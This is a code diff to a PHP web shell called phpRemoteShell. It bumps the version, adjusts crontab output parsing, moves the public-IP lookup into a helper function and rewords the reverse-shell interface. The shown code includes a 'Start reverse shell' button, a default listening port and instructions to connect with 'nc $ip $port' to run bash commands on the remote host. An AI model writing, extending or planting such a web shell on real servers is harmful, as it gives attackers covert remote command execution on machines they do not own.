@@ -22,7 +22,7 @@
   if (!class_exists ('phpRemoteShell')){
 
   define ('APP_NAME', 'phpRemoteShell');
-  define ('APP_VERSION', '0.12.1git201906111');
+  define ('APP_VERSION', '0.12.1git201906121');
 
   // Main configuration array
   $config = array ();
@@ -732,7 +732,7 @@
       switch ($name)
       {
         case 'crontab': 
-          $ret = (preg_match ('/^(crontab|no crontab)/', $res)); 
+          $ret = (preg_match ('/^(#|crontab|no crontab)/', $res)); 
           break;
 
         default:
@@ -1963,11 +1963,17 @@
 
           $this->command_current_execute ();
 
-          if ($this->vars['command_current_output'] != '' &&
-              strpos ($this->vars['command_current_output'], 'not found') === false &&
-              strpos ($this->vars['command_current_output'], 'such file') === false)
+          if ($this->vars['command_current_output'] &&
+              !preg_match ('/(not found|such file)/',
+                           $this->vars['command_current_output']))
           {
-            $infos[$k] = $this->vars['command_current_output'];
+            if (($r = trim(($k == 'Crontab') ?
+                 preg_replace ('/^#.*$(?:\r\n|\n)?/m', '',
+                               $this->vars['command_current_output']) :
+                 $this->vars['command_current_output'])))
+            {
+              $infos[$k] = $r;
+            }
             break;
           }
         }
@@ -4313,7 +4319,6 @@
 
     function display_reverse_shell_html ()
     {
-      $public_access = 0;
       $ips = array ();
 
       if (($this->check_shell_command ('ip') &&
@@ -4322,18 +4327,11 @@
                ($r = $this->execute_command_safe ('ifconfig'))) &&
                  preg_match_all ('/inet\s+([0-9\.]+)/i', $r, $m))
       {
-        $public_ip = $this->php_function_enabled ('gethostbyname') ?
-          gethostbyname ($_SERVER['HTTP_HOST']) : $_SERVER['HTTP_HOST'];
         foreach ($m[1] as $ip)
         {
-          if (!preg_match ('/^127/', $ip))
+          if (strpos ($ip, '127') !== 0)
           {
             array_push ($ips, $ip);
-
-            if ($ip == $public_ip)
-            {
-              $public_access = 1;
-            }
           }
         }
       }
@@ -4360,10 +4358,7 @@
         echo ":";
         echo "<input type=text name=rs_port value='".
           (($this->vars['rs_port'])?$this->vars['rs_port']:4000)."' size=5/>" ;
-        if (!$public_access)
-        {
-          echo "<p><i>The public IP ($public_ip) of the remote host is not registred on its interfaces&nbsp;!</i></p>";
-        }
+        echo "<p><i>The IP you will choose may be different from the outside.</i></p>";
         echo "<p><input type=button onclick=\"
         document.forms[0].target='_blank';display_type.value='".SHELL_EXECUTE_REVERSE."';
         _submit()\" value='Start reverse shell'></p>";
@@ -4928,6 +4923,7 @@
           <span class=info_value>yes</span><br>";
       }
 
+      $public_ip = $this->get_public_ip ();
       return sprintf("
         <div id=profile_title>
           <div>
@@ -4951,8 +4947,7 @@
         $this->get_browse_method_info_html (),
         $_SERVER['REMOTE_ADDR'],
         $_SERVER['SERVER_ADDR'],
-        $this->php_function_enabled ('gethostbyname') ?
-          gethostbyname ($_SERVER['HTTP_HOST']) : $_SERVER['HTTP_HOST'],
+        ($public_ip) ? $public_ip : '?',
         ($GLOBALS['php_errors']) ? '' : 'display:none',
         $this->htmlentities($GLOBALS['php_errors']));
     }
@@ -5276,6 +5271,15 @@
       {
         exit (0);
       }
+    }
+
+    function get_public_ip ()
+    {
+      $ret = $this->php_function_enabled ('gethostbyname') ?
+               gethostbyname ($_SERVER['HTTP_HOST']) :
+               $_SERVER['HTTP_HOST'];
+
+      return (strpos ($ret, '127') !== 0) ? $ret : null;
     }
 
     function get_prs_url ()
@@ -6370,6 +6374,7 @@ exit ();
         <b>Listening on $ip:$port</b>
         <p>Use netcat or any other client on your local machine to execute bash commands on the remote host.</p>
         <p>For example: <code>nc $ip $port</code></p>
+        <p><b>The IP you have chosen may be different from the outside.</b></p>
         <p><i>It's just a <b>basic shell</b>, which means that sometimes it will not work and that the connection may be cut or looped at any time. Some commands will be rewritten (like <code>ping</code> or <code>top</code>), others will be emulated (like <code>clear</code>). It is likely that in dying (when you grab the <code>shutdown</code> command from your client) it causes a zombie process.</i></p>
         </div>";
   
